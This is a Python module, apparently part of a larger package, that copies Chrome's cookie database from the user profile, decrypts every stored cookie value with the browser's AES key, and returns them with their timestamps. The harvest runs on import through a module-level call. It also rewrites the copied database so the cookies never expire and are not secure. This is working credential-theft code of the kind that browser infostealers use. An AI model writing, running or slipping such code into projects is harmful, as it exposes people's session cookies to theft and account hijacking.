import os
import sqlite3
import shutil
from .chrome_datetime import get_chrome_datetime
from .encrypt import get_encryption_key
from .decrypt import decrypt_password


def extract():
    # local sqlite Chrome cookie database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    # copy the file to current directory
    # as the database will be locked if chrome is currently open
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        # copy file when does not exist in the current directory
        shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    # ignore decoding errors
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    # get the cookies from `cookies` table
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    # you can also search by domain, e.g thepythoncode.com
    # cursor.execute("""
    # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
    # FROM cookies
    # WHERE host_key like '%thepythoncode.com%'""")
    # get the AES key
    key = get_encryption_key()
    cookies = []
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_password(encrypted_value, key)
        else:
            # already decrypted
            decrypted_value = value
        cookies.append({"host": host_key, "cookie_name": name, 'cookie_value_decypted': decrypted_value,
                        'creation_datetime_UTC': get_chrome_datetime(creation_utc),
                        "last_access_datetime_UTC": get_chrome_datetime(last_access_utc),
                        "expire_datetime_UTC": get_chrome_datetime(expires_utc)})
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    # commit changes
    db.commit()
    # close connection
    db.close()
    return cookies

extract_cookie = extract()

if __name__ == "__main__":
    print(extract_cookie)
